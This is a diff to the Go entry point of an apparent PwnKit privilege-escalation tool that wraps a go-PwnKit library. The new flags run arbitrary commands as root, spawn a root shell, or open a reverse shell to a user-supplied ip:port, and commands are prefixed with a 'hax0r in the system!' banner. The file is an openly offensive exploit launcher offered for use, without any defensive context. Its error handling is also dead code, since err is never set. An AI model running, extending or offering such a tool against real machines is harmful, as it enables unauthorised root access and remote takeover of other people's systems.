@@ -2,20 +2,28 @@ package main
 
 import (
 	"flag"
+	"fmt"
 	"github.com/OXDBXKXO/go-PwnKit"
 )
 
 func main() {
-	cmd := flag.String("c", "/bin/sh", "Command to execute as root")
-	greetings := flag.Bool("g", false, "Append id and greetings to your command")
-	reverseShell := flag.String("r", "", "Optionally open a reverse-shell instead. Format: ip:port")
+	cmd := flag.String("c", "", "Command to execute as root")
+	shell := flag.Bool("s", false, "Spawn a root shell")
+	reverseShell := flag.String("r", "", "Open a reverse-shell instead. Format: ip:port")
 	flag.Parse()
 
+	var err error
 	if *reverseShell != "" {
 		gopwnkit.RevShell(*reverseShell)
-	} else if *greetings {
+	} else if *cmd != "" {
 		gopwnkit.Command("id; echo \"hax0r in the system!\";" + *cmd)
+	} else if *shell {
+		gopwnkit.Shell()
 	} else {
-		gopwnkit.Command(*cmd)
+		flag.Usage()
+	}
+
+	if err != nil {
+		fmt.Println(err)
 	}
 }
